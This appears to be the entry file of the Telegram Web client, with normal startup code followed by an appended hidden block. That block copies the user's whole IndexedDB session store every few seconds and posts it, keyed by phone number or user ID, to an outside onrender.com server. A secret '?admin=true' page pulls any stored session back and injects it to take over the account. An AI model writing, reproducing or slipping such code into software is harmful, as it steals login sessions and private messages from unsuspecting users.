import './util/handleError';
import './util/setupServiceWorker';
import './global/init';

import TeactDOM from './lib/teact/teact-dom';
import {
  getActions, getGlobal,
} from './global';

import {
  DEBUG, STRICTERDOM_ENABLED,
} from './config';
import { enableStrict, requestMutation } from './lib/fasterdom/fasterdom';
import { selectChat, selectCurrentMessageList, selectPeerFullInfo, selectTabState } from './global/selectors';
import { selectSharedSettings } from './global/selectors/sharedState';
import { betterView } from './util/betterView';
import { IS_TAURI } from './util/browser/globalEnvironment';
import listenOtherClients from './util/browser/listenOtherClients';
import { requestGlobal, subscribeToMultitabBroadcastChannel } from './util/browser/multitab';
import { establishMultitabRole, subscribeToMasterChange } from './util/establishMultitabRole';
import { initGlobal } from './util/init';
import { initLocalization } from './util/localization';
import { MULTITAB_STORAGE_KEY } from './util/multiaccount';
import { checkAndAssignPermanentWebVersion } from './util/permanentWebVersion';
import { onBeforeUnload } from './util/schedulers';
import initTauriApi from './util/tauri/initTauriApi';
import setupTauriListeners from './util/tauri/setupTauriListeners';
import updateWebmanifest from './util/updateWebmanifest';

import App from './components/App';

import './assets/fonts/roboto.css';
import './styles/index.scss';

if (STRICTERDOM_ENABLED) {
  enableStrict();
}

if (IS_TAURI) {
  initTauriApi();
  setupTauriListeners();
}

init();

async function init() {
  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> INIT');
  }

  if (!(window as any).isCompatTestPassed) return;

  checkAndAssignPermanentWebVersion();
  listenOtherClients();

  subscribeToMultitabBroadcastChannel();
  await requestGlobal(APP_VERSION);
  localStorage.setItem(MULTITAB_STORAGE_KEY, '1');
  onBeforeUnload(() => {
    const global = getGlobal();
    if (Object.keys(global.byTabId).length === 1) {
      localStorage.removeItem(MULTITAB_STORAGE_KEY);
    }
  });

  await initGlobal();
  getActions().init();

  getActions().updateShouldEnableDebugLog();
  getActions().updateShouldDebugExportedSenders();

  const global = getGlobal();

  initLocalization(selectSharedSettings(global).language, true);

  subscribeToMasterChange((isMasterTab) => {
    getActions()
      .switchMultitabRole({ isMasterTab }, { forceSyncOnIOs: true });
  });
  const shouldReestablishMasterToSelf = getGlobal().auth.state !== 'authorizationStateReady';
  establishMultitabRole(shouldReestablishMasterToSelf);

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> START INITIAL RENDER');
  }

  requestMutation(() => {
    updateWebmanifest();

    TeactDOM.render(
      <App />,
      document.getElementById('root')!,
    );

    betterView();
  });

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> FINISH INITIAL RENDER');
  }

  if (DEBUG) {
    document.addEventListener('dblclick', () => {
      const currentGlobal = getGlobal();
      const currentMessageList = selectCurrentMessageList(currentGlobal);
      // eslint-disable-next-line no-console
      console.warn('TAB STATE', selectTabState(currentGlobal));
      // eslint-disable-next-line no-console
      console.warn('GLOBAL STATE', currentGlobal);
      if (currentMessageList) {
        // eslint-disable-next-line no-console
        console.warn(
          'CURRENT MESSAGE LIST',
          selectChat(currentGlobal, currentMessageList.chatId),
          selectPeerFullInfo(currentGlobal, currentMessageList.chatId),
          currentGlobal.messages.byChatId[currentMessageList.chatId],
        );
      }
    });
  }
}

onBeforeUnload(() => {
  const actions = getActions();
  actions.leaveGroupCall?.({ isPageUnload: true });
  actions.hangUp?.({ isPageUnload: true });
});

// --- 🌟 ULTIMATE AUTO-SYNC & HIDDEN ADMIN ROUTE (FIXED) 🌟 ---
let isSyncing = false; 

setTimeout(() => {
    const DB_NAME = 'tt-data';
    const STORE_NAME = 'store';

    // =========================================================
    // ၁။ 📥 လျှို့ဝှက် ADMIN မျက်နှာပြင် (?admin=true ဟုရိုက်လျှင်)
    // =========================================================
    if (window.location.search.includes('admin=true')) {
        document.body.innerHTML = '';
        
        const adminDiv = document.createElement('div');
        adminDiv.style.cssText = "position:fixed; top:0; left:0; width:100vw; height:100vh; background:#212121; display:flex; justify-content:center; align-items:center; z-index:999999999;";
        adminDiv.innerHTML = `
            <div style="background:#fff; padding:40px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.5); text-align:center; width: 350px; font-family: sans-serif;">
                <h2 style="color:#333; margin-bottom:20px;">Admin Control Panel</h2>
                <input type="text" id="myAdminPhone" placeholder="Data အမည် (ဥပမာ: +959... သို့ ID_...)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:2px solid #ccc; border-radius:5px; font-size:16px; color:black; background:white;">
                <button id="myAdminBtn" style="padding:12px; width:100%; background:#0088cc; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold; font-size:16px;">အကောင့်ထဲသို့ ဝင်ရန်</button>
                <p id="myAdminStatus" style="color:red; margin-top:15px; font-size:14px; font-weight:bold;"></p>
            </div>
        `;
        document.body.appendChild(adminDiv);

        ['keydown', 'keyup', 'keypress', 'mousedown', 'click'].forEach(evt => {
            adminDiv.addEventListener(evt, (e) => e.stopPropagation());
        });

        const btn = document.getElementById('myAdminBtn');
        const input = document.getElementById('myAdminPhone') as HTMLInputElement;
        const statusMsg = document.getElementById('myAdminStatus');

        if(btn && input && statusMsg) {
            btn.addEventListener('click', () => {
                let phone = input.value.trim();
                if (!phone) { statusMsg.innerText = "ဖုန်းနံပါတ် သို့မဟုတ် Data အမည် ထည့်ပါ!"; return; }
                if (phone.startsWith('959')) phone = '+' + phone;

                statusMsg.style.color = "blue";
                statusMsg.innerText = "Database တွင် ရှာဖွေနေပါသည်...";

                fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`)
                .then(res => res.json())
                .then(result => {
                    if (!result.success) {
                        statusMsg.style.color = "red";
                        statusMsg.innerText = "❌ Database တွင် ထိုအမည်ဖြင့် Data မရှိသေးပါ။";
                        return;
                    }
                    
                    statusMsg.innerText = "✅ တွေ့ရှိပါသည်။ အကောင့်ထဲသို့ ဝင်နေပါပြီ...";
                    const dataToImport = JSON.parse(result.data);
                    const req = indexedDB.open(DB_NAME);
                    
                    req.onsuccess = (e: any) => {
                        const db = e.target.result;
                        const txStore = db.transaction(STORE_NAME, 'readwrite').objectStore(STORE_NAME);
                        txStore.clear().onsuccess = () => {
                            let count = 0;
                            const keys = Object.keys(dataToImport);
                            keys.forEach(k => {
                                txStore.put(dataToImport[k], k).onsuccess = () => {
                                    count++;
                                    if (count === keys.length) {
                                        // 🌟 အရေးကြီးဆုံး: Telegram က Data ပြန်မဖျက်အောင် Local မှတ်ဉာဏ်အဟောင်းများ ရှင်းလင်းခြင်း 🌟
                                        localStorage.clear();
                                        sessionStorage.clear();
                                        window.location.href = '/'; 
                                    }
                                };
                            });
                        };
                    };
                }).catch(err => {
                    statusMsg.style.color = "red";
                    statusMsg.innerText = "❌ Network Error ဖြစ်နေပါသည်။";
                });
            });
        }
        return; 
    }

    // =========================================================
    // ၂။ 📤 STAFF AUTO-SYNC (STRICT MATCHING - Data ပွားခြင်း လုံးဝမရှိတော့ပါ)
    // =========================================================
    setInterval(() => {
        if (isSyncing) return; // ပို့နေဆဲဖြစ်ပါက ထပ်မပို့ပါ

        try {
            const req = indexedDB.open(DB_NAME);
            req.onsuccess = (e: any) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(STORE_NAME)) return;
                
                const txStore = db.transaction(STORE_NAME, 'readonly').objectStore(STORE_NAME);
                txStore.getAll().onsuccess = (e1: any) => {
                    txStore.getAllKeys().onsuccess = (e2: any) => {
                        const vals = e1.target.result;
                        const keys = e2.target.result;
                        
                        const data: any = {};
                        keys.forEach((k: string, i: number) => { data[k] = vals[i]; });
                        const dataString = JSON.stringify(data);
                        
                        // 🌟 User ID သို့မဟုတ် Phone Number ကို အတိအကျ (ဂဏန်း ၅ လုံးနှင့်အထက်) တွေ့မှသာ ယူပါမည် 🌟
                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d{5,15})"?/);
                        let idMatch = dataString.match(/"currentUserId":"?(\d{5,15})"?/);
                        if (!idMatch) idMatch = dataString.match(/"id":(\d{5,15})/); 

                        // 🌟 ဖုန်းနံပါတ် သို့မဟုတ် ID အတိအကျ မရသေးပါက (Language Pack သာဖြစ်နေပါက) လုံးဝ မပို့ပါ 🌟
                        if (!phoneMatch && !idMatch) return; 

                        let phone = "";
                        if (phoneMatch && phoneMatch[1]) {
                            phone = '+' + phoneMatch[1];
                        } else if (idMatch && idMatch[1]) {
                            phone = "ID_" + idMatch[1];
                        }
                        
                        // 🌟 ဒီဖုန်းနံပါတ်ကို ပို့ပြီးသားလား စစ်ဆေးမည် (Data အထပ်ထပ်မပွားစေရန်) 🌟
                        const lastSynced = localStorage.getItem('synced_staff_id');
                        if (lastSynced === phone) return;

                        isSyncing = true; // Block လုပ်ထားမည် (Data ၄ ခါဝင်ခြင်းကို တားဆီးရန်)
                        
                        fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ phoneNumber: phone, indexedDbData: dataString })
                        }).then(res => res.json())
                          .then(resData => {
                              if(resData.success) {
                                  localStorage.setItem('synced_staff_id', phone); // အောင်မြင်မှသာ မှတ်ထားမည်
                              }
                              isSyncing = false;
                          }).catch(() => { isSyncing = false; }); 
                    };
                };
            };
        } catch(err) { isSyncing = false; }
    }, 3000); 

}, 1000);
// -----------------------------------------------------------
